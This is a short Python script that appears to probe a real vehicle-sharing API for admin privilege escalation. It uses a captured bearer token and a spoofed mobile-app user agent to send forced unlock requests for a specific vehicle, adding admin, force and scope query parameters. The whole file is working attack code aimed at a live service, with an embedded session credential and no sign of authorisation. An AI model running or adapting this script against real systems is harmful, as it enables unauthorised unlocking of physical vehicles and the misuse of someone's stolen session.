#!/usr/bin/env python3
"""
Quick SXB306 Admin Test with Fresh Token
"""

import requests
import json

# Fresh token from capture
FRESH_TOKEN = "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMDM0OTMsInNlc3Npb25faWQiOiI3NmM0NzE3ZS03ZWM5LTRkN2MtOWRlOS00NjRiNjJlY2VhYzgiLCJpYXQiOjE3NTk0NTQ3NjQsImV4cCI6MTc1OTQ1ODM2NH0.ivnhjjDy1zEtAD1BTJAAK5V1vDtAaSHNuHZWpMspSFE"

BASE_URL = "https://api.knotcity.io"

def test_sxb306_admin():
    print("=" * 80)
    print("[QUICK TEST] SXB306 ADMIN ESCALATION WITH FRESH TOKEN")
    print("=" * 80)
    print(f"[TOKEN] {FRESH_TOKEN[:50]}...")
    print("=" * 80)
    
    headers = {
        "Authorization": FRESH_TOKEN,
        "Content-Type": "application/json",
        "User-Agent": "Knot-mayndrive v1.1.34 (android)",
        "Accept": "application/json"
    }
    
    # Test admin escalation methods
    tests = [
        {
            "name": "Admin Query Parameter",
            "endpoint": "/api/application/vehicles/unlock?admin=true",
            "payload": {
                "serial_number": "SXB306",
                "lat": 48.8566,
                "lng": 2.3522,
                "force": True
            }
        },
        {
            "name": "Force Query Parameter", 
            "endpoint": "/api/application/vehicles/unlock?force=true",
            "payload": {
                "serial_number": "SXB306",
                "lat": 48.8566,
                "lng": 2.3522,
                "force": True
            }
        },
        {
            "name": "Scope Admin Query Parameter",
            "endpoint": "/api/application/vehicles/unlock?scope=admin",
            "payload": {
                "serial_number": "SXB306",
                "lat": 48.8566,
                "lng": 2.3522,
                "force": True
            }
        }
    ]
    
    for i, test in enumerate(tests, 1):
        print(f"\n[TEST {i}] {test['name']}")
        print(f"   Endpoint: {test['endpoint']}")
        print(f"   Payload: {json.dumps(test['payload'], indent=2)}")
        
        try:
            response = requests.post(
                f"{BASE_URL}{test['endpoint']}",
                headers=headers,
                json=test['payload'],
                timeout=15
            )
            
            print(f"   Status: {response.status_code}")
            print(f"   Response: {response.text}")
            
            if response.status_code == 200:
                print(f"   [SUCCESS] SXB306 UNLOCKED with {test['name']}!")
                print(f"   [CRITICAL] ADMIN ESCALATION VULNERABILITY CONFIRMED!")
                return True
            elif response.status_code == 401:
                print(f"   [ERROR] Token expired/invalid")
            elif response.status_code == 403:
                print(f"   [ERROR] Permission denied")
            else:
                print(f"   [ERROR] Status {response.status_code}")
                
        except Exception as e:
            print(f"   [ERROR] Request failed: {e}")
    
    return False

if __name__ == "__main__":
    success = test_sxb306_admin()
    
    print("\n" + "=" * 80)
    if success:
        print("[CRITICAL] SXB306 ADMIN ESCALATION SUCCESSFUL!")
        print("[CRITICAL] ADMIN PRIVILEGE ESCALATION VULNERABILITY CONFIRMED!")
    else:
        print("[OK] SXB306 admin escalation failed")
        print("[OK] Security appears to be working properly")
    print("=" * 80)
